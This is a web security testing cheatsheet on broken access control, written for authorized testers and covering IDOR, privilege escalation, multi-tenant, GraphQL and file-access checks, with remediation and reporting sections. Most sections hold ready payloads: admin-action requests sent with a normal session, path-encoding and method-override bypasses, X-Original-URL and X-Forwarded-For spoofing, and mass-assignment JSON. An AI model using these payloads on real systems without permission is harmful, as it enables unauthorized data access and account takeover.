# Access Control Vulnerability Cheatsheet

This cheatsheet is a quick testing reference for access control vulnerabilities in web applications and APIs.

Use only on systems where you have permission to test.

## Quick Definition

Broken access control occurs when a user can access data, functionality, or actions that should be restricted.

Main categories:

- Vertical privilege escalation: normal user accesses admin or higher-privileged functionality.
- Horizontal privilege escalation: one user accesses another user's data or actions.
- Context-dependent bypass: user performs an action outside the allowed workflow or state.

## Minimum Test Accounts

Create or obtain:

- Anonymous user
- Normal User A
- Normal User B
- Admin or privileged user
- User from another tenant or organization, if the app is multi-tenant

## Fast Testing Workflow

1. Map all roles, resources, actions, and workflows.
2. Capture requests for each role.
3. Replay privileged requests with a low-privileged session.
4. Swap object IDs between User A and User B.
5. Try hidden paths and direct endpoint access.
6. Change HTTP methods.
7. Test path normalization and encoding bypasses.
8. Modify role, user, tenant, and ownership parameters.
9. Test APIs separately from the UI.
10. Confirm whether unauthorized actions cause real state changes.

## High-Value Targets

```text
/admin
/administrator
/admin-panel
/manage
/management
/console
/debug
/internal
/users
/users/delete
/api/admin
/api/users
/api/roles
/api/invites
/api/export
/api/files
/download
/attachments
/reports
/billing
/invoices
/orders
/settings
```

## Parameters to Tamper With

```text
id
uid
user
userId
username
email
account
accountId
customer
customerId
client
clientId
order
orderId
invoice
invoiceId
file
fileId
document
documentId
message
messageId
role
roleId
isAdmin
admin
permission
permissions
group
groupId
team
teamId
org
orgId
organization
organizationId
tenant
tenantId
workspace
workspaceId
project
projectId
```

## Vertical Privilege Escalation Tests

### Direct Admin Path Access

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
```

### Admin Action as Normal User

```http
POST /admin/deleteUser HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
Content-Type: application/x-www-form-urlencoded

username=carlos
```

### Role Parameter Tampering

```http
POST /my-account/change-email HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
Content-Type: application/json

{
  "email": "attacker@example.com",
  "role": "admin",
  "isAdmin": true
}
```

### Cookie Tampering

```http
GET /admin HTTP/1.1
Host: target.com
Cookie: session=normal-user-session; Admin=true
```

Try:

```text
admin=true
Admin=true
isAdmin=true
is_admin=1
role=admin
roleId=1
userType=administrator
```

## Horizontal Privilege Escalation Tests

### Object ID Swap

User A request:

```http
GET /my-account?id=1001 HTTP/1.1
Host: target.com
Cookie: session=user-a-session
```

Change to User B's ID:

```http
GET /my-account?id=1002 HTTP/1.1
Host: target.com
Cookie: session=user-a-session
```

### Path ID Swap

```http
GET /api/users/1002 HTTP/1.1
Host: target.com
Cookie: session=user-a-session
```

### Nested Object Swap

```http
GET /api/users/1001/orders/9001 HTTP/1.1
Host: target.com
Cookie: session=user-a-session
```

Try changing both IDs:

```text
/api/users/1002/orders/9001
/api/users/1001/orders/9002
/api/users/1002/orders/9002
```

## IDOR Testing

Common IDOR locations:

```text
URL path
Query string
Request body
JSON body
GraphQL variables
Cookies
Headers
Referer URLs
Download links
Redirect URLs
WebSocket messages
Mobile API calls
```

ID formats to test:

```text
123
000123
user_123
USR-123
550e8400-e29b-41d4-a716-446655440000
MTIz
eyJpZCI6MTIzfQ==
```

Base64 checks:

```text
123 -> MTIz
{"id":123} -> eyJpZCI6MTIzfQ==
```

## Admin URL Discovery

Check:

```text
/robots.txt
/sitemap.xml
/security.txt
/crossdomain.xml
/clientaccesspolicy.xml
JavaScript files
Source maps
HTML comments
API documentation
OpenAPI or Swagger files
Mobile app traffic
Error messages
```

Useful paths:

```text
/swagger
/swagger-ui
/api-docs
/openapi.json
/v1/docs
/v2/docs
/graphql
/graphiql
```

## Path Bypass Payloads

Try these against protected paths:

```text
/admin
/admin/
/admin//
/admin/.
/admin/./
/admin/..
/admin/../admin
/ADMIN
/Admin
/%61dmin
/%2e/admin
/admin%2f
/admin%2FdeleteUser
/admin%252fdeleteUser
/admin;/deleteUser
/admin;/
/admin.json
/admin.css
/admin?x=1
/admin#fragment
```

## HTTP Method Bypass

Original:

```http
POST /admin/deleteUser HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
Content-Type: application/x-www-form-urlencoded

username=carlos
```

Try:

```http
GET /admin/deleteUser?username=carlos HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
```

```http
HEAD /admin/deleteUser?username=carlos HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
```

Also test:

```text
GET
POST
PUT
PATCH
DELETE
HEAD
OPTIONS
```

Method override headers:

```text
X-HTTP-Method: PUT
X-HTTP-Method-Override: DELETE
X-Method-Override: PATCH
```

## Header-Based Bypass Payloads

### URL Rewrite Headers

```http
GET / HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
X-Original-URL: /admin
```

```http
GET /anything HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
X-Rewrite-URL: /admin/deleteUser
```

### Localhost or Internal IP Headers

```text
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

### Host Headers

```text
Host: localhost
X-Forwarded-Host: localhost
X-Host: localhost
X-Forwarded-Server: localhost
```

### Referer Header

```http
GET /admin/deleteUser?username=carlos HTTP/1.1
Host: target.com
Cookie: session=normal-user-session
Referer: https://target.com/admin
```

## Multi-Step Workflow Bypass

Example workflow:

```text
Step 1: GET /admin/users
Step 2: POST /admin/selectUser
Step 3: POST /admin/confirmDelete
```

Tests:

- Replay step 3 directly as a normal user.
- Skip step 1 and step 2.
- Change the user ID in the final step.
- Reuse an old confirmation token.
- Repeat a completed action.
- Change request order.
- Use another user's workflow token.

## Context-Dependent Tests

Try to:

- Edit a shipped order.
- Cancel an already completed transaction.
- Reuse a single-use coupon.
- Approve your own request.
- Download paid content before payment.
- Access an expired invitation.
- Use an old password reset or email verification link.
- Access resources after logout.
- Access resources after role downgrade.
- Use a deleted or disabled account's token.
- Modify locked, archived, or read-only resources.

## API Authorization Tests

### REST

Test every method:

```text
GET /api/users/123
POST /api/users
PUT /api/users/123
PATCH /api/users/123
DELETE /api/users/123
```

Try:

```json
{
  "userId": "victim-id",
  "accountId": "victim-account",
  "tenantId": "other-tenant",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["admin"]
}
```

### Bulk Endpoints

```http
POST /api/users/bulk HTTP/1.1
Content-Type: application/json

{
  "ids": [1001, 1002, 1003]
}
```

Check whether unauthorized records are included in the response.

### Export Endpoints

```text
/api/export?userId=1002
/api/reports?tenantId=other-tenant
/api/invoices/export
```

Exports are high-risk because they often bypass normal UI filters.

## GraphQL Tests

### Object-Level Access

```graphql
query {
  user(id: "1002") {
    id
    email
    role
  }
}
```

### Field-Level Access

```graphql
query {
  me {
    id
    email
    role
    permissions
    salary
    apiKey
  }
}
```

### Mutation Access

```graphql
mutation {
  updateUser(id: "1002", input: { role: "admin" }) {
    id
    role
  }
}
```

### Batch Query Check

```graphql
query {
  a: user(id: "1001") { id email }
  b: user(id: "1002") { id email }
  c: user(id: "1003") { id email }
}
```

## Multi-Tenant Tests

Change:

```text
tenantId
orgId
organizationId
workspaceId
teamId
companyId
projectId
accountId
```

Test:

- Tenant A user reads Tenant B object.
- Tenant A user updates Tenant B object.
- Tenant A user exports Tenant B data.
- Search returns records from other tenants.
- Invitations work across tenants.
- File links expose another tenant's files.
- Admin of one tenant can manage another tenant.

Secure checks must include tenant ownership, not only user authentication.

## File Access Tests

Targets:

```text
/download?file=invoice.pdf
/download?id=123
/api/files/123
/attachments/123
/uploads/private/file.pdf
/storage/users/1001/report.pdf
```

Try:

- Change file ID.
- Change filename.
- Change user ID in path.
- Use another user's signed URL.
- Use a signed URL after logout.
- Use a signed URL after expiry.
- Remove signature parameters.
- Change file extension.
- Access thumbnails or previews for private files.

## Field-Level Authorization Tests

Check whether normal users can read or update restricted fields.

Sensitive fields:

```text
role
isAdmin
permissions
password
mfaSecret
apiKey
accessToken
refreshToken
balance
creditLimit
discount
salary
ssn
tenantId
ownerId
createdBy
approvedBy
verified
emailVerified
```

Mass assignment payload:

```json
{
  "name": "attacker",
  "email": "attacker@example.com",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["*"],
  "tenantId": "victim-tenant",
  "balance": 999999
}
```

## Response Signs

### Strong Evidence of Vulnerability

```text
200 OK with unauthorized data
201 Created for unauthorized object
204 No Content after unauthorized update/delete
302 redirect but action still executes
Different user's data appears in response
Admin-only action changes application state
Cross-tenant data appears in response
Restricted field is updated
```

### Secure Responses

```text
401 Unauthorized
403 Forbidden
404 Not Found
No state change
No sensitive data returned
Consistent response for inaccessible objects
```

## Burp Suite Tips

- Use Repeater to replay requests with different sessions.
- Use Intruder to enumerate object IDs in authorized labs.
- Use Comparer to compare User A and User B responses.
- Use Logger or HTTP history to find hidden API calls.
- Use Match and Replace to swap sessions quickly.
- Use Param Miner to discover hidden headers and parameters.
- Use Autorize or similar extensions carefully to detect authorization differences.

## Manual Verification Checklist

- Logged in as low-privileged user.
- Confirmed the target action should be restricted.
- Replayed the exact request with a low-privileged session.
- Confirmed unauthorized data exposure or state change.
- Verified impact with two different users.
- Checked that the response is not only cached data.
- Checked whether the action persists after refresh.
- Captured request and response evidence.
- Avoided damaging actions on real targets.

## Common False Positives

- UI shows data but server rejects updates.
- Cached response from browser or proxy.
- Same object legitimately shared between users.
- User has inherited permissions through a team or role.
- Admin session was accidentally reused.
- Test accounts belong to the same tenant with shared access.
- Response contains generic data, not private object data.

## Remediation Checklist

- Enforce authorization on the server.
- Use deny-by-default authorization.
- Check role, object ownership, tenant boundary, action, and state.
- Centralize authorization logic.
- Apply checks to every HTTP method.
- Normalize paths before authorization decisions.
- Do not trust user-controlled role or ownership parameters.
- Use allowlists for writable fields.
- Filter response fields based on permission.
- Enforce tenant scoping in database queries.
- Expire and scope signed URLs.
- Add negative authorization tests.
- Log suspicious access attempts.

## Report Skeleton

```text
Title:
Broken access control allows [role/user] to [action] [resource]

Severity:
[Low/Medium/High/Critical]

Affected endpoint:
[METHOD] [PATH]

Vulnerable parameter or object:
[id/userId/tenantId/role/etc.]

Steps to reproduce:
1. Log in as [User A / normal user].
2. Send this request:
   [request]
3. Modify [parameter/session/header].
4. Observe [unauthorized data/action].

Expected result:
The server should deny the request and prevent any state change.

Actual result:
The server allows [data access/action].

Impact:
[Explain privilege escalation, data exposure, account takeover, tenant breach, or financial/business impact.]

Recommendation:
Add server-side authorization checks for [role/object/action/tenant/state] and regression tests for unauthorized access.
```

## Quick Payload List

```text
?admin=true
?isAdmin=true
?role=admin
?userId=2
?accountId=2
?tenantId=2
?orgId=2
?fileId=2
?debug=true
```

```text
Cookie: admin=true
Cookie: role=admin
Cookie: isAdmin=1
```

```text
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Referer: https://target.com/admin
```

```text
/admin
/admin/
/admin/.
/admin//
/ADMIN
/%61dmin
/admin%2f
/admin%252f
```

## One-Line Rule

For every request, ask:

```text
Is this user allowed to perform this action on this exact object in this exact context?
```
